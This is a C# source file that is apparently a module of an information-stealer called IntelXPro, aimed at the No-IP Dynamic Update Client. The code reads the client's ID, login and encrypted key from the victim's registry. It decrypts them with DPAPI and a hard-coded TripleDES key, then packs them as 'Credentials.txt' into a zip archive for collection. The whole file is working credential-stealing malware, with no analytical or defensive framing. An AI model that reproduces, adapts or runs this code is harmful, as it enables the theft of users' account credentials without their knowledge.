using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class NoIp : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "SOFTWARE\\Vitalwerks\\DUC\\v4";
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue("CKey");
                    object value2 = registryKey.GetValue("CID");
                    object value3 = registryKey.GetValue("UserName");
                    if (value != null || value2 != null || value3 != null)
                    {
                        string text2 = DecryptString((byte[])value2);
                        string text3 = DecryptString((byte[])value);
                        string text4 = DecryptString((byte[])value3);
                        string text5 = "NoIp\\Credentials.txt";
                        Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                        counterApplications.Name = "NoIp";
                        counterApplications.Files.Add(text + " => " + text5);
                        counterApplications.Files.Add(text5);
                        zip.AddTextFile(text5, "clientid: " + text2 + "\nlogin: " + text4 + "\npassword hash: " + text3);
                        counter.Applications.Add(counterApplications);
                    }
                }
            }
        }

        private string DecryptString(byte[] message)
        {
            try
            {
                if (message == null)
                {
                    return null;
                }
                byte[] array = DpApi.Decrypt(message);
                if (array == null)
                {
                    return null;
                }
                byte[] key = new byte[16]
                {
                127, 238, 115, 104, 83, 74, 138, 240, 49, 50,
                224, 252, 103, 181, 23, 117
                };
                using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
                {
                    tripleDESCryptoServiceProvider.Key = key;
                    tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
                    tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                    using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor())
                    {
                        byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
                        return Encoding.UTF8.GetString(bytes);
                    }
                }
            }
            catch
            {
                return null;
            }
        }
    }
}
